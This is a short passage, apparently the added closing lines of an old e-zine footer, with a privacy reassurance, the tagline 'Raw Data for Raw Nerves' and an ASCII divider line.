+   where you live, or what your phone number is. We are not Big Brother.
+
+                          "Raw Data for Raw Nerves"
+
+X-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-X
+
